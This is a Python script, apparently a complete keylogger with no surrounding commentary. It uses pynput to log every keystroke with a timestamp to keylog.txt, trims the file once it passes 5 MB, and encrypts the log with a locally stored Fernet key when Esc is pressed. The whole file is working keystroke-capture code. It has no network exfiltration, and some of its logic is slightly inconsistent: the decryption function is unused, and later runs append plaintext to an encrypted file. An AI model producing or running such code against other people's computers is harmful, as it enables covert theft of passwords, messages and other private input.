import os
import logging
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet


log_dir = ""
log_file = os.path.join(log_dir, "keylog.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")


max_log_size = 5 * 1024 * 1024  # 5 MB


key_file_path = 'secret.key'
if os.path.exists(key_file_path):
    with open(key_file_path, 'rb') as key_file:
        key = key_file.read()
else:
    key = Fernet.generate_key()
    with open(key_file_path, 'wb') as key_file:
        key_file.write(key)

cipher_suite = Fernet(key)

def encrypt_data(data):
    encrypted_data = cipher_suite.encrypt(data.encode('utf-8'))
    return encrypted_data

def decrypt_data(encrypted_data):
    decrypted_data = cipher_suite.decrypt(encrypted_data).decode('utf-8')
    return decrypted_data

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

    check_log_size()

def check_log_size():
    if os.path.getsize(log_file) > max_log_size:
        with open(log_file, "r") as f:
            lines = f.readlines()
        
        with open(log_file, "w") as f:
            f.writelines(lines[int(len(lines) / 2):])  
def encrypt_log_file():
    with open(log_file, "rb") as f:
        data = f.read()
    
    encrypted_data = cipher_suite.encrypt(data)

    with open(log_file, "wb") as f:
        f.write(encrypted_data)


def on_release(key):
    if key == keyboard.Key.esc:
        encrypt_log_file()
      
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
